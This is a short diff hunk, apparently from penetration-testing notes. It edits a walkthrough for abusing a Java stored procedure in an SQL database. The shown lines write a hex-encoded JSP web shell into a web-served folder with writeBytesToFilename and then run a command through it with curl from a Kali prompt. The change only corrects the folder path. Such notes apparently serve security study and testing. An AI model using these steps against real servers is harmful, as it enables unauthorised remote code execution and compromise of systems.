@@ -16,5 +16,5 @@ LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
 > python encode.py
 call writeBytesToFilename('../../path/to/web-folder/shell.jsp', cast('3c2540207061676520696d706f7274[...]' as VARBINARY(1024))) 
 
-# kali@kali:~$ curl http://IP:PORT/path/to/folder/shell.jsp?cmd=hostname
+# kali@kali:~$ curl http://IP:PORT/path/to/web-folder/shell.jsp?cmd=hostname
 ```
